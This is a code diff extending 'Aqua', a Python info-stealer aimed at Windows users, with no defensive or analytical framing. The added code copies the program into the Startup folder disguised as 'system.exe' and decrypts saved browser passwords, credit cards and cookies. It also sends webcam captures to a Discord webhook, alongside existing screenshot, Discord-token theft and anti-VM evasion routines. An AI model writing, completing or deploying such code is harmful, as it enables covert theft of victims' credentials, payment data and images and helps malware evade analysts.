@@ -1,7 +1,11 @@
 import base64
+import json
 import shutil
 import glob
+import sqlite3
 import subprocess
+import sys
+from datetime import datetime, timedelta
 from random import randint
 
 import cv2
@@ -50,13 +54,15 @@ def makeDir():
     if not os.path.exists('C:/Users/Public/Aqua/Info'):
         os.mkdir("C:/Users/Public/Aqua/Info")
         print("Created Info")
+    if not os.path.exists('C:/Users/Public/Aqua/Arc'):
+        os.mkdir("C:/Users/Public/Aqua/Arc")
+        print("Created Arc")
 
 
 def takeSS():
     for i in range(50):
         with mss() as sct:
             sct.shot(mon=-1, output=f"{Aqua}/ss/{i}.png")
-            print(f"Done SS Number {i}")
 
     frame_folder = f'{Aqua}/ss'
 
@@ -93,18 +99,23 @@ def getCam():
                     cv2.imwrite(f'{Aqua}/Cam/{str(x)}.png', image)
                     print(f"Webcam[{x}] Done Pic " + str(i))
                 del camera
-                webhook.content = f'```{user} | Webcam Number {x} | HWID: {get_HWID()}```'
-                with open(f'{Aqua}/Cam/{x}.png', 'rb') as f:
-                    file_data = f.read()
-                webhook.add_file(file_data, f'Aqua_{user}_Cam_{x}.png')
                 print(f"Done Grabbing Webcam Numb {x}")
-                webhook.execute()
-                webhook.remove_files()
             except:
                 webhook.content = f'```{user} | Failed To Grab Webcam {x} | HWID: {get_HWID()}```'
                 print(f"Failed Webcam Numb {x}")
                 webhook.execute()
                 webhook.remove_files()
+        try:
+            for a in range(test):
+                with open(f"{Aqua}/Cam/{a}.png", "rb") as file:
+                    data = file.read()
+                webhook.add_file(data, f"Aqua_{user}_Webcam{a}.png")
+            webhook.content = f'```{user} | Webcams | HWID: {get_HWID()}```'
+            webhook.execute()
+            webhook.remove_files()
+            print("Done Sending Webcams")
+        except:
+            print("Some Error In Webcam")
     except:
         webhook.content = f'```{user} | Webcam Grab Unknown Error | HWID: {get_HWID()}```'
         print(f"Unknown Error")
@@ -341,7 +352,7 @@ def AntiVm():
                          '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4',
                          'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250',
                          '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C',
-                         '9961A120-E691-4FFE-B67B-F0E4115D5919')
+                         '9961A120-E691-4FFE-B67B-F0E4115D5919', '94C508AC-39CC-11E4-AA3A-8A13E4E42000')
     BLACKLISTED_COMPUTERNAMES = (
         'bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh',
         'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6',
@@ -390,11 +401,11 @@ def AntiVm():
         r2 = subprocess.run(
             "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2",
             capture_output=True, shell=True)
-        gpucheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output=True,
+        gpuCheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output=True,
                                                    shell=True).stdout.decode(errors="ignore").splitlines()[
             2].strip().lower() for x in ("virtualbox", "vmware"))
-        dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
-        return (r1.returncode != 1 and r2.returncode != 1) or gpucheck or dircheck
+        dirCheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
+        return (r1.returncode != 1 and r2.returncode != 1) or gpuCheck or dirCheck
 
     def killTasks() -> bool:  # Kills blacklisted processes
         if TaskKill(*BLACKLISTED_TASKS):
@@ -434,7 +445,209 @@ def AntiVm():
         print("Continuing After CheckVm")
 
 
+# Get Self
+
+
+def GetSelf() -> tuple[str, bool]:  # Returns the location of the file and whether exe mode is enabled or not
+    if hasattr(sys, "frozen"):
+        return sys.executable, True
+    else:
+        return __file__, False
+
+
+# Copy To StartUp
+
+
+def copy_to_startup() -> None:
+    try:
+        startup_path: str = os.path.join(os.getenv("APPDATA"), r"Microsoft/Windows/Start Menu/Programs/Startup")
+        dest_path: str = os.path.join(startup_path, "system.exe")
+        if not os.path.exists(dest_path):
+            try:
+                shutil.copyfile(GetSelf()[0], dest_path)
+                print("Copyed To Startup")
+                webhook.content = f'```{user} | StartUp Info | HWID: {get_HWID()}```'
+                webhook.add_embed(embed)
+                embed.set_title("<:monkaS:1017974150612136087> StartUp Info <:monkaS:1017974150612136087>")
+                embed.set_description(
+                    f"| Status : <:tick:988374705524326470> |\n| Path : {roaming}/Microsoft/Windows/Start Menu/Programs/Startup/System.exe |")
+                webhook.execute()
+                webhook.remove_embeds()
+                webhook.remove_files()
+            except:
+                webhook.content = f'```{user} | StartUp Info | HWID: {get_HWID()}```'
+                webhook.add_embed(embed)
+                embed.set_title("<:monkaS:1017974150612136087> StartUp Info <:monkaS:1017974150612136087>")
+                embed.set_description(
+                    f"| Status : <:tick:988374705524326470> |\n| Path : {roaming}/Microsoft/Windows/Start Menu/Programs/Startup/System.exe |")
+                webhook.execute()
+                webhook.remove_embeds()
+                webhook.remove_files()
+        else:
+            webhook.content = f'```{user} | StartUp Info | HWID: {get_HWID()}```'
+            webhook.add_embed(embed)
+            embed.set_title("<:monkaS:1017974150612136087> StartUp Info <:monkaS:1017974150612136087>")
+            embed.set_description(
+                f"| Status : <:tick:988374705524326470> |\n| Path : {roaming}/Microsoft/Windows/Start Menu/Programs/Startup/System.exe |")
+            webhook.execute()
+            webhook.remove_embeds()
+            webhook.remove_files()
+    except:
+        webhook.content = f'```{user} | StartUp Info | HWID: {get_HWID()}```'
+        webhook.add_embed(embed)
+        embed.set_title("<:PepeHands:1017972631565250600> StartUp Info <:PepeHands:1017972631565250600>")
+        embed.set_description(
+            f"| Status : <a:CatNo:1135259345383342091> |\n| Reason : Unknown |")
+        webhook.execute()
+        webhook.remove_embeds()
+        webhook.remove_files()
+
+
+def getBrowsers():
+    try:
+        appdata = os.getenv('LOCALAPPDATA')
+
+        browsers = {
+            'avast': appdata + '\\AVAST Software\\Browser\\User Data',
+            'amigo': appdata + '\\Amigo\\User Data',
+            'torch': appdata + '\\Torch\\User Data',
+            'kometa': appdata + '\\Kometa\\User Data',
+            'orbitum': appdata + '\\Orbitum\\User Data',
+            'cent-browser': appdata + '\\CentBrowser\\User Data',
+            '7star': appdata + '\\7Star\\7Star\\User Data',
+            'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
+            'vivaldi': appdata + '\\Vivaldi\\User Data',
+            'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
+            'google-chrome': appdata + '\\Google\\Chrome\\User Data',
+            'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
+            'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
+            'uran': appdata + '\\uCozMedia\\Uran\\User Data',
+            'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
+            'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+            'iridium': appdata + '\\Iridium\\User Data',
+        }
+
+        data_queries = {
+            'login_data': {
+                'query': 'SELECT action_url, username_value, password_value FROM logins',
+                'file': '\\Login Data',
+                'columns': ['URL', 'Email', 'Password'],
+                'decrypt': True
+            },
+            'credit_cards': {
+                'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
+                'file': '\\Web Data',
+                'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
+                'decrypt': True
+            },
+            'cookies': {
+                'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
+                'file': '\\Network\\Cookies',
+                'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
+                'decrypt': True
+            },
+            'history': {
+                'query': 'SELECT url, title, last_visit_time FROM urls',
+                'file': '\\History',
+                'columns': ['URL', 'Title', 'Visited Time'],
+                'decrypt': False
+            },
+            'downloads': {
+                'query': 'SELECT tab_url, target_path FROM downloads',
+                'file': '\\History',
+                'columns': ['Download URL', 'Local Path'],
+                'decrypt': False
+            }
+        }
+
+        def get_master_key(path: str):
+            if not os.path.exists(path):
+                return
+
+            if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
+                return
+
+            with open(path + "\\Local State", "r", encoding="utf-8") as f:
+                c = f.read()
+            local_state = json.loads(c)
+
+            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            key = key[5:]
+            key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+            return key
+
+        def decrypt_password(buff: bytes, key: bytes) -> str:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)
+            decrypted_pass = decrypted_pass[:-16].decode()
+
+            return decrypted_pass
+
+        def save_results(browser_name, type_of_data, content):
+            if not os.path.exists(f'{Aqua}/Arc/{browser_name}'):
+                os.mkdir(f'{Aqua}/Arc/{browser_name}')
+            if content is not None:
+                open(f'{Aqua}/Arc/{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8").write(content)
+            else:
+                print(f"\t [-] No Data Found!")
+
+        def get_data(path: str, profile: str, key, type_of_data):
+            db_file = f'{path}\\{profile}{type_of_data["file"]}'
+            if not os.path.exists(db_file):
+                return
+            result = ""
+            shutil.copy(db_file, 'temp_db')
+            conn = sqlite3.connect('temp_db')
+            cursor = conn.cursor()
+            cursor.execute(type_of_data['query'])
+            for row in cursor.fetchall():
+                row = list(row)
+                if type_of_data['decrypt']:
+                    for i in range(len(row)):
+                        if isinstance(row[i], bytes):
+                            row[i] = decrypt_password(row[i], key)
+                if data_type_name == 'history':
+                    if row[2] != 0:
+                        row[2] = convert_chrome_time(row[2])
+                    else:
+                        row[2] = "0"
+                result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
+            conn.close()
+            os.remove('temp_db')
+            return result
+
+        def convert_chrome_time(chrome_time):
+            return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
+
+        def installed_browsers():
+            available = []
+            for x in browsers.keys():
+                if os.path.exists(browsers[x]):
+                    available.append(x)
+            return available
+
+        available_browsers = installed_browsers()
+
+        for browser in available_browsers:
+            browser_path = browsers[browser]
+            master_key = get_master_key(browser_path)
+
+            for data_type_name, data_type in data_queries.items():
+                data = get_data(browser_path, "Default", master_key, data_type)
+                save_results(browser, data_type_name, data)
+
+        # Send Webhook
+        print("Done Browser Stealin")
+    except:
+        # Send Error
+        pass
+
+
 # Clean Up
+
+
 def cleanUp():
     shutil.rmtree(Aqua)
     print("Cleaned Up")
@@ -449,11 +662,12 @@ webhook.avatar_url = "https://cdn.discordapp.com/attachments/1179144552154673252
 
 def runAqua():
     AntiVm()
+    copy_to_startup()
     makeDir()
     takeSS()
     getCam()
     getDcToken()
-    cleanUp()
+    getBrowsers()
 
 
 runAqua()
